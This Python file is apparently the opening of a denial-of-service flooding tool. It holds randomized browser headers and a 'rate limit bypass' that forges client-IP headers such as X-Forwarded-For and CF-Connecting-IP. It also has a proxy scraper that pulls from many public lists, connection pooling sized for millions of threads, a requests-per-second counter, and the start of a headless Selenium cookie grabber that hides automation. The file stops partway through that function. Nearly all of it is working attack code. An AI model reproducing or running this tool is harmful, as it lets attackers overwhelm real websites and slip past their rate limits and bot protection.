######CREATE BY ALE###########
from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx, struct, re, asyncio, json, hashlib, hmac, uuid, ipaddress
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
from sys import stdout
from colorama import Fore, init
import concurrent.futures
import multiprocessing
import queue
import urllib3
import warnings
import signal
import gc
import psutil
warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =======================CONFIG =======================


CPU_COUNT = multiprocessing.cpu_count()
RAM_GB = psutil.virtual_memory().total / (1024**3)
MAX_THREADS = 10000000 
MAX_PROCESSES = CPU_COUNT * 4  

stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+f" Machine: {CPU_COUNT} cores | {RAM_GB:.1f} GB RAM\n")
stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+f" Unlimited threads enabled - no caps\n")

#####################################======================= UUSER AGENTS =======================##########################################################

ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; OnePlus 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Vivaldi/6.2',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Vivaldi/6.4',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Vivaldi/6.5',
]

# ======================= RATE LIMIT BYPASS =======================

class IPRotator:
    @staticmethod
    def random():
        style = random.randint(0, 10)
        if style == 0:
            return f"{random.choice([24, 47, 68, 73, 75, 76, 97, 98, 99, 104, 108, 173, 174, 184, 204, 206, 209])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        elif style == 1:
            return f"{random.choice([3,13,18,34,35,44,45,50,52,54,63,64,65,66,67,69])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        elif style == 2:
            return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        elif style == 3:
            return f"{random.choice(['10','172.16','192.168'])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        elif style == 4:
            return f"2001:{random.randint(0,9999):04x}:{random.randint(0,9999):04x}:{random.randint(0,9999):04x}::{random.randint(1,254)}"
        elif style == 5:
            return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        elif style == 6:
            return f"{random.choice([8, 9, 12, 15, 17, 20, 21, 22, 23, 26, 28, 29, 30, 31, 32, 33])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        elif style == 7:
            return f"{random.randint(11,197)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(2,254)}"
        elif style == 8:
            return f"20{random.randint(0,1)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        else:
            return f"192.{random.choice([168,169,170,171,172,173,174,175])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    @staticmethod
    def chain(length=7):
        return ', '.join([IPRotator.random() for _ in range(length)])

# ======================= ENHANCED HEADERS =======================

ACCEPT_VALUES = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml;q=0.9,application/xml;q=0.8,*/*;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
]

ACCEPT_LANGS = [
    'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9',
    'de-DE,de;q=0.9', 'ja-JP,ja;q=0.9', 'ko-KR,ko;q=0.9',
    'zh-CN,zh;q=0.9', 'en-CA,en;q=0.8', 'en-AU,en;q=0.8',
    'es-ES,es;q=0.9', 'pt-BR,pt;q=0.9', 'ru-RU,ru;q=0.9',
    'it-IT,it;q=0.9', 'nl-NL,nl;q=0.9', 'sv-SE,sv;q=0.9',
    'pl-PL,pl;q=0.9', 'tr-TR,tr;q=0.9', 'ar-SA,ar;q=0.9',
    'da-DK,da;q=0.9', 'fi-FI,fi;q=0.9', 'nb-NO,nb;q=0.9',
    'cs-CZ,cs;q=0.9', 'hu-HU,hu;q=0.9', 'ro-RO,ro;q=0.9',
]

ACCEPT_ENCODINGS = ['gzip, deflate, br', 'gzip, deflate', 'br, gzip, deflate', 'deflate, gzip, br', 'br', 'gzip', 'deflate', 'identity;q=0']

CACHE_CONTROLS = [
    'no-cache, no-store, must-revalidate', 'no-cache', 'max-age=0',
    'private, no-cache, no-store', 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
    'no-transform, no-cache', 'max-age=0, no-cache', 'no-store',
]

SEC_CH_UA = [
    '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    '"Not_A Brand";v="8", "Chromium";v="121", "Google Chrome";v="121"',
    '"Not_A Brand";v="8", "Chromium";v="122", "Google Chrome";v="122"',
    '"Not_A Brand";v="8", "Chromium";v="123", "Google Chrome";v="123"',
    '"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"',
    '"Not_A Brand";v="8", "Chromium";v="125", "Google Chrome";v="125"',
    '"Not_A Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    '"Not_A Brand";v="8", "Chromium";v="127", "Google Chrome";v="127"',
    '"Not_A Brand";v="99", "Chromium";v="126", "Google Chrome";v="126"',
]

SEC_CH_UA_PLATFORMS = ['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"', '"Chrome OS"']

def enhanced_random_headers(target=None, use_rate_limit_bypass=True):
    headers = {
        'User-Agent': random.choice(ua),
        'Accept': random.choice(ACCEPT_VALUES),
        'Accept-Language': random.choice(ACCEPT_LANGS),
        'Accept-Encoding': random.choice(ACCEPT_ENCODINGS),
        'Cache-Control': random.choice(CACHE_CONTROLS),
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': random.choice(['document', 'empty', 'iframe', 'nested-document', 'frame', 'object', 'embed']),
        'Sec-Fetch-Mode': random.choice(['navigate', 'no-cors', 'cors', 'same-origin', 'websocket', 'nested-navigate']),
        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site', 'same-site']),
        'Sec-Fetch-User': '?1',
        'DNT': random.choice(['1', '0']),
        'Priority': random.choice(['u=0, i', 'u=1, i', 'u=1, i', 'u=2, i']),
    }

    if random.random() > 0.25:
        headers['sec-ch-ua'] = random.choice(SEC_CH_UA)
        headers['sec-ch-ua-mobile'] = random.choice(['?0', '?1'])
        headers['sec-ch-ua-platform'] = random.choice(SEC_CH_UA_PLATFORMS)
        headers['sec-ch-ua-arch'] = random.choice(['"x86"', '"arm64"', '"x64"', '"arm"'])
        headers['sec-ch-ua-model'] = random.choice(['', '"Pixel 8"', '"iPhone 15"', '"Galaxy S24"', '"MacBook Pro"'])
        headers['sec-ch-ua-full-version'] = random.choice(['"120.0.6099.109"', '"121.0.6167.85"', '"122.0.6261.119"', '"123.0.6312.86"', '"124.0.6367.91"', '"125.0.6422.76"'])
        headers['sec-ch-ua-bitness'] = random.choice(['"64"', '"32"'])
        headers['sec-ch-ua-wow64'] = '?0'

    if use_rate_limit_bypass:
        ip = IPRotator.random()
        ip_chain = IPRotator.chain(7)

        headers['X-Forwarded-For'] = ip_chain

        if random.random() > 0.3:
            headers['X-Real-IP'] = ip
            headers['X-Originating-IP'] = IPRotator.random()
            headers['X-Remote-IP'] = IPRotator.random()
            headers['X-Remote-Addr'] = IPRotator.random()
            headers['True-Client-IP'] = ip
            headers['CF-Connecting-IP'] = IPRotator.random()
            headers['CF-IPCountry'] = random.choice(['US', 'GB', 'DE', 'FR', 'JP', 'KR', 'BR', 'RU', 'CN', 'IN', 'CA', 'AU', 'NL', 'SE', 'PL'])
            headers['CF-Ray'] = f"{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}-{random.choice(['LHR', 'FRA', 'AMS', 'IAD', 'SFO', 'NRT', 'SYD', 'GRU'])}"

        if random.random() > 0.4:
            headers['CDN-Loop'] = f"cloudflare_{IPRotator.random()}"
            headers['Akamai-Origin-Hop'] = random.choice(['0', '1', '2'])
            headers['X-Cache'] = random.choice(['HIT', 'MISS', 'BYPASS', 'EXPIRED', 'STALE', 'UPDATING', 'HIT from cloudfront'])
            headers['X-Edge-Location'] = f"{random.choice(['LHR', 'FRA', 'AMS', 'IAD', 'SFO', 'NRT', 'SYD', 'GRU', 'HKG', 'SIN'])}"

        if random.random() > 0.5:
            headers['Via'] = f'1.1 {IPRotator.random()}, 1.1 {IPRotator.random()}, 2.0 {IPRotator.random()}'
            headers['X-Via'] = IPRotator.random()

        if isinstance(target, dict) and 'host' in target:
            headers['X-Forwarded-Host'] = target['host']
            headers['X-Original-Host'] = target['host']
            headers['X-Host'] = target['host']

        if random.random() > 0.3:
            headers[f'X-{random.randint(1000,9999)}'] = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
            headers[f'X-Custom-{random.randint(1,99)}'] = str(uuid.uuid4())[:24]

        if random.random() > 0.6:
            headers['Accept-Datetime'] = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
            headers['Date'] = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')

        if random.random() > 0.75:
            headers['TE'] = random.choice(['Trailers', 'deflate', 'gzip', '', 'chunked'])

        if random.random() > 0.6:
            headers['X-Request-ID'] = str(uuid.uuid4())[:36]
            headers['X-Trace-ID'] = str(uuid.uuid4())[:36]
            headers['X-Correlation-ID'] = str(uuid.uuid4())[:36]

        if random.random() > 0.85:
            headers['X-Content-Type-Options'] = 'nosniff'
            headers['X-Frame-Options'] = random.choice(['DENY', 'SAMEORIGIN', 'ALLOW-FROM *'])
            headers['X-XSS-Protection'] = random.choice(['1; mode=block', '1', '0'])

        if random.random() > 0.9:
            headers['Referer'] = random.choice([
                f'https://www.google.com/search?q={random.choice(["news","blog","shop","login","admin","api","vpn","proxy","download","upload"])}',
                f'https://www.bing.com/search?q={random.choice(["news","blog","shop","login","admin","api","vpn","proxy"])}',
                f'https://t.co/{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}',
                'https://www.facebook.com/',
                'https://www.reddit.com/',
                'https://twitter.com/home',
                'https://www.linkedin.com/feed/',
                'https://news.ycombinator.com/',
                'https://stackoverflow.com/questions/12345',
                'https://github.com/search?q=test',
            ])

        if random.random() > 0.95:
            headers['Origin'] = random.choice([
                'https://www.google.com',
                'https://www.bing.com',
                'https://api.example.com',
                'https://cdn.cloudflare.net',
                'https://js.stripe.com',
                'https://connect.facebook.net',
            ])

    return headers

random_headers = enhanced_random_headers

# ======================= ASYNC ENGINE SETUP =======================

# Global connection pools for maximum reuse
session_pool = queue.Queue()
session_pool_lock = threading.Lock()
MAX_SESSION_POOL = 50000

def prefill_session_pool(use_proxy=False):
    """Pre-fill session pool for instant availability"""
    for _ in range(min(MAX_SESSION_POOL, 10000)):
        try:
            session = requests.Session()
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=10000, pool_maxsize=100000, pool_block=False,
                max_retries=0
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            if use_proxy:
                proxy_str = get_random_proxy()
                if proxy_str:
                    session.proxies.update(get_proxy_dict(proxy_str))
            session_pool.put(session, block=False)
        except:
            break

def get_pooled_session(use_proxy=False):
    """Get session from pool or create new one"""
    try:
        return session_pool.get(block=False)
    except queue.Empty:
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=10000, pool_maxsize=100000, pool_block=False,
            max_retries=0
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        if use_proxy:
            proxy_str = get_random_proxy()
            if proxy_str:
                session.proxies.update(get_proxy_dict(proxy_str))
        return session

def return_pooled_session(session):
    """Return session to pool"""
    try:
        session_pool.put(session, block=False)
    except queue.Full:
        try:
            session.close()
        except:
            pass

############################################################# ======================= REQUEST COUNTER =======================######################

req_counter = [0]
counter_lock = threading.Lock()

def inc_req(n=1):
    with counter_lock:
        req_counter[0] += n

def countdown(duration_sec):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration_sec))
    start_val = req_counter[0]
    while True:
        remaining = (until - datetime.datetime.now()).total_seconds()
        if remaining > 0:
            elapsed = int(duration_sec) - remaining
            current = req_counter[0]
            rps = (current - start_val) / max(1, elapsed) if elapsed > 0 else 0
            stdout.write(f"\r {Fore.MAGENTA}[*]{Fore.WHITE} => {remaining:.0f}s | RPS: {rps:,.0f} | Total: {current:,}")
            stdout.flush()
            time.sleep(0.2)
        else:
            total = req_counter[0]
            stdout.write(f"\r {Fore.MAGENTA}[*]{Fore.WHITE} Done! Total Requests: {total:,}{' ' * 40}\n")
            stdout.flush()
            return

########################################## ======================= PROXY ENGINE =======================##########################################

proxies = []
proxy_lock = threading.Lock()

def get_proxylist(type_list):
    all_proxies = []
    sources = []

    if "SOCKS5" in type_list or "ALL" in type_list:
        sources.extend([
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=socks5",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/elliottophell/proxy-list/main/socks5.txt",
            "https://raw.githubusercontent.com/BlackoutMercenary/Proxy-List/main/socks5.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks5.txt",
            "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
            "https://www.proxy-list.download/api/v1/get?type=socks5&anon=elite",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://proxyspace.pro/api/v1/proxys?limit=1000&type=socks5",
        ])
    if "HTTP" in type_list or "ALL" in type_list:
        sources.extend([
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP.txt",
            "https://raw.githubusercontent.com/elliottophell/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
            "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
            "https://raw.githubusercontent.com/BlackoutMercenary/Proxy-List/main/http.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000",
            "https://proxylist.geonode.com/api/proxy-list?protocols=http&limit=1000",
            "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
            "https://raw.githubusercontent.com/henryyuki/ProxyList/main/http.txt",
        ])
    if "SOCKS4" in type_list or "ALL" in type_list:
        sources.extend([
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=10000&country=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4.txt",
            "https://raw.githubusercontent.com/elliottophell/proxy-list/main/socks4.txt",
            "https://raw.githubusercontent.com/BlackoutMercenary/Proxy-List/main/socks4.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
            "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
        ])
    if "SOCKS" in type_list or "ALL" in type_list:
        sources.extend([
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=10000&country=all",
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all",
        ])

    def fetch_source(src):
        try:
            r = requests.get(src, timeout=15)
            data = r.text.strip().split('\n')
            for line in data:
                line = line.strip()
                if line and ':' in line and not any(x in line.lower() for x in ['html', '<', '>', '{', '[']):
                    all_proxies.append(line)
        except:
            pass

    threads = []
    for src in sources:
        t = threading.Thread(target=fetch_source, args=(src,), daemon=True)
        t.start()
        threads.append(t)

    for t in threads:
        t.join(timeout=25)

    all_proxies = list(set([p.strip() for p in all_proxies if p.strip() and ':' in p]))
    return all_proxies

def get_proxies():
    global proxies
    if os.path.exists("./proxy.txt"):
        with open("./proxy.txt", 'r') as f:
            proxies = f.read().split('\n')
        proxies = [p.strip() for p in proxies if p.strip()]
        if proxies:
            stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+f" Loaded {len(proxies)} proxies from proxy.txt\n")
            return True

    stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" Fetching fresh proxies...\n")
    proxies = get_proxylist("ALL")
    if proxies:
        with open("./proxy.txt", 'w') as f:
            f.write('\n'.join(proxies))
        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+f" Loaded {len(proxies)} proxies\n")
        return True
    return False

def get_random_proxy():
    """Thread-safe random proxy selection"""
    with proxy_lock:
        if proxies:
            return random.choice(proxies)
    return None

def parse_proxy(proxy_str):
    """Parse proxy string into type, host, port dict"""
    proxy_str = proxy_str.strip()
    ptype = 'http'
    host = proxy_str
    port = '80'
    
    if '://' in proxy_str:
        ptype = proxy_str.split('://')[0].lower()
        host = proxy_str.split('://')[1]
    
    if ':' in host:
        parts = host.split(':')
        host = parts[0]
        port = parts[1]
    
    return {'type': ptype, 'host': host, 'port': port}

def get_proxy_dict(proxy_str):
    """Get requests-compatible proxy dict"""
    parsed = parse_proxy(proxy_str)
    ptype = parsed['type']
    if ptype in ['socks5', 'socks4', 'socks']:
        scheme = ptype if ptype != 'socks' else 'socks5'
        return {
            'http': f'{scheme}://{parsed["host"]}:{parsed["port"]}',
            'https': f'{scheme}://{parsed["host"]}:{parsed["port"]}'
        }
    else:
        return {
            'http': f'http://{parsed["host"]}:{parsed["port"]}',
            'https': f'http://{parsed["host"]}:{parsed["port"]}'
        }

################################ ======================= FUNCTIONS =======================############################################################

def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
    return target

def get_cookie(url):
    global useragent, cookieJAR, cookie
    try:
        from selenium import webdriver
        options = webdriver.ChromeOptions()
        arguments = [
            '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars',
            '--disable-logging', '--disable-gpu', '--headless',
            '--lang=en', '--start-maximized',
            '--disable-dev-shm-usage', '--disable-blink-features=AutomationControlled',
            f'--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        for argument in arguments:
            options.add_argument(argument)
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        driver = webdriver.Chrome(options=options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
